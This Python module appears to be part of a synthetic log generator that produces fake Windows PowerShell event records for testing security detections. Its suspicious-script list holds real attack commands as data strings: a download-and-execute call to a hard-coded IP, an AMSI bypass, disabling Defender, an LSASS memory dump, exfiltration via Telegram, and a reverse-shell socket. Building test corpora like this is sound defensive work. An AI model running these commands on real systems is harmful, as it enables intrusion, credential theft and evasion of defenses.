from __future__ import annotations

import base64
import json
import random
import uuid
from datetime import datetime, timezone

from sources.base_source import LogEvent, LogSource, ScenarioEntities, TransportName
from utils.faker_helpers import DOMAIN, random_user, random_windows_host, weighted_choice

# 4104 (script block) is the one that matters: it records what actually ran
# after PowerShell decoded and de-obfuscated it, which is the only place the
# real command is visible. 4103 (module/pipeline) gives invocation context.
# 400/403/800 come from the older Windows PowerShell channel.
EVENT_IDS = [4104, 4103, 400, 403, 800]
EVENT_WEIGHTS = [45, 30, 10, 10, 5]

_EVENT_META = {
    4104: ("Creating Scriptblock text", "Microsoft-Windows-PowerShell/Operational", 4104),
    4103: ("Module logging", "Microsoft-Windows-PowerShell/Operational", 4103),
    400: ("Engine state is changed from None to Available.", "Windows PowerShell", 400),
    403: ("Engine state is changed from Available to Stopped.", "Windows PowerShell", 403),
    800: ("Pipeline execution details for command line.", "Windows PowerShell", 800),
}

# Benign day-to-day automation. Without this the channel reads as if every
# script on the estate is malicious, which is not a useful test corpus.
_BENIGN_SCRIPTS = [
    "Get-ChildItem -Path C:\\Users -Recurse -Filter *.log | Select-Object FullName, Length",
    "Import-Module ActiveDirectory; Get-ADUser -Filter * -Properties LastLogonDate",
    "$svc = Get-Service -Name W32Time; if ($svc.Status -ne 'Running') { Start-Service W32Time }",
    "Get-WmiObject -Class Win32_OperatingSystem | Select-Object Caption, Version",
    "Invoke-RestMethod -Uri https://intranet.corp.local/api/inventory -Method Post -Body $payload",
    "Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Corp\\Agent' -Name Version -Value '4.2.1'",
]

# Recognisable offensive tradecraft, in the form it appears post-decode.
_SUSPICIOUS_SCRIPTS = [
    "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.9/a.ps1')",
    "$c=[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($e));IEX $c",
    "Add-MpPreference -ExclusionPath C:\\Users\\Public -ExclusionExtension .exe",
    "Set-MpPreference -DisableRealtimeMonitoring $true",
    "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
    ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
    "Get-ADUser -Filter * -Properties ServicePrincipalName | Where-Object {$_.ServicePrincipalName -ne $null}",
    "rundll32.exe C:\\Windows\\System32\\comsvcs.dll,MiniDump 624 C:\\Windows\\Temp\\l.dmp full",
    "Invoke-WebRequest -Uri http://api.telegram.org/bot/sendDocument -Method Post -InFile $z",
    "New-Object System.Net.Sockets.TCPClient('185.220.101.9',4444)",
]

_COMMANDS = ["Get-Process", "Get-Service", "Invoke-Expression", "Invoke-WebRequest",
             "Get-ADUser", "Set-MpPreference", "New-Object", "Start-Process"]

_HOST_APPS = [
    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -W Hidden -Enc",
    "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
    "C:\\Windows\\System32\\wsmprovhost.exe",  # remoting
]


def _script_text(suspicious: bool) -> str:
    return random.choice(_SUSPICIOUS_SCRIPTS if suspicious else _BENIGN_SCRIPTS)


def _build(*, event_id: int, host: str, user: str, suspicious: bool | None = None) -> dict:
    now = datetime.now(timezone.utc)
    domain = DOMAIN.split(".")[0].upper()
    message, channel, task = _EVENT_META[event_id]
    if suspicious is None:
        suspicious = random.random() < 0.2

    data: dict = {}
    if event_id == 4104:
        script = _script_text(suspicious)
        data = {
            "MessageNumber": 1,
            "MessageTotal": 1,
            "ScriptBlockText": script,
            "ScriptBlockId": str(uuid.uuid4()),
            "Path": "" if random.random() < 0.6 else f"C:\\Users\\{user}\\Documents\\task.ps1",
        }
    elif event_id == 4103:
        script = _script_text(suspicious)
        data = {
            "ContextInfo": (
                f"Severity = Informational\r\n"
                f"Host Name = ConsoleHost\r\n"
                f"Host Application = {random.choice(_HOST_APPS)}\r\n"
                f"Engine Version = 5.1.19041.4291\r\n"
                f"Runspace ID = {uuid.uuid4()}\r\n"
                f"User = {domain}\\{user}\r\n"
                f"Connected User = \r\n"
                f"Shell ID = Microsoft.PowerShell\r\n"
            ),
            "UserData": "",
            "Payload": f"CommandInvocation({random.choice(_COMMANDS)}): \"{script[:120]}\"",
        }
    elif event_id == 800:
        data = {
            "ContextInfo": f"Host Application = {random.choice(_HOST_APPS)}\r\nUser = {domain}\\{user}\r\n",
            "UserData": "",
            "Payload": f"CommandLine={_script_text(suspicious)[:160]}",
        }
    else:
        data = {
            "NewEngineState": "Available" if event_id == 400 else "Stopped",
            "PreviousEngineState": "None" if event_id == 400 else "Available",
            "SequenceNumber": random.randint(1, 40),
            "HostName": "ConsoleHost",
            "HostVersion": "5.1.19041.4291",
            "HostId": str(uuid.uuid4()),
            "HostApplication": random.choice(_HOST_APPS),
            "EngineVersion": "5.1.19041.4291",
            "RunspaceId": str(uuid.uuid4()),
        }

    # PowerShell raises 4104 to Warning when its own heuristics flag the block,
    # which is the field most script-block detections actually key on.
    level = 3 if (event_id == 4104 and suspicious) else 4

    return {
        "EventID": event_id,
        "TimeCreated": now.isoformat(),
        "Channel": channel,
        "Computer": host,
        "Provider": "Microsoft-Windows-PowerShell" if event_id >= 4000 else "PowerShell",
        "ProviderGuid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A",
        "Level": level,
        "Task": task,
        "Opcode": 15 if event_id == 4104 else 0,
        "Keywords": "0x0",
        "EventRecordID": random.randint(100000, 9999999),
        "ProcessID": random.randint(400, 30000),
        "ThreadID": random.randint(8, 4000),
        "SecurityUserID": f"{domain}\\{user}",
        "EventData": data,
        "Message": message,
    }


class WindowsPowerShellSource(LogSource):
    id = "windows_powershell"
    display_name = "Windows PowerShell"
    description = "PowerShell operational log — script block logging (4104), module logging (4103), engine lifecycle"
    default_transport: TransportName = "wec"
    supported_transports = ["wec", "syslog"]
    default_eps = 4.0
    tags = ["windows", "endpoint", "powershell", "script"]

    async def generate(self) -> LogEvent:
        event = _build(
            event_id=weighted_choice(EVENT_IDS, EVENT_WEIGHTS),
            host=random_windows_host(),
            user=random_user(),
        )
        return LogEvent(raw=json.dumps(event), structured=event, format="windows_evtx", source_id=self.id)

    async def generate_with_entities(
        self, entities: ScenarioEntities, overrides: dict | None = None
    ) -> LogEvent:
        """Scenario mode: attribute the script execution to the run's host and
        user.

        Recognized overrides: event_id, suspicious (bool), script.
        """
        overrides = overrides or {}
        # .get(key, default) -- not `or` -- so an explicit falsy override
        # (e.g. suspicious=False) is honored instead of falling back to random.
        event = _build(
            event_id=int(overrides.get("event_id", weighted_choice(EVENT_IDS, EVENT_WEIGHTS))),
            host=entities.host,
            user=entities.username,
            suspicious=overrides.get("suspicious"),
        )
        # An explicit script wins over the sampled one, so a scenario can show
        # the exact tradecraft it's describing.
        script = overrides.get("script")
        if script is not None and event["EventID"] == 4104:
            event["EventData"]["ScriptBlockText"] = script
        return LogEvent(raw=json.dumps(event), structured=event, format="windows_evtx", source_id=self.id)
